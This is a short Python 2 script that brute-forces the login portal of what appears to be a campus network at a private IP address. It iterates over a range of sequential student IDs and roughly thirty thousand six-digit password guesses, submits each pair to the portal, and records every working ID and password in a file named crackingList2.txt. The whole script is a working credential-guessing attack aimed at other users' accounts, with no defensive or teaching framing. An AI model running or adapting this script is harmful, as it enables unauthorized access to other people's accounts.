import re, urllib2, urllib, cookielib

def campuslogin(user,password):
    url = 'http://10.3.8.211'
    login_page = url
    try:
        cj = cookielib.CookieJar()
        opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
        opener.addheaders = [('User-agent','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)')]
        # The dict below have to be adjusted accordingly (like F12 in Chrome)
        data = urllib.urlencode({'DDDDD':user,'upass':password,'savePWD':0,'0MKKey':''})
        opener.open(login_page,data)
        op=opener.open(url)
        data= op.read()
        if (re.search(r'External network IP address mapping',data) != None):
            print 'You have successfully logined'
            print user
            print password
            return True
    except Exception,e:

        print str(e)
        print 'login failed'

IDlist = [ 2014111000+x for x in range(0,10)]
password = [10000*z + y for z in range(1,31) for y in range(1,1000)]
f = open('crackingList2.txt', 'w')

for i in IDlist:
    for j in password:
        print i, '',j
        if campuslogin(i,str(j).zfill(6)):
            f.write(str(i))
            f.write('  ')
            f.write(str(j).zfill(6))            
            f.write('\r\n')
f.close()
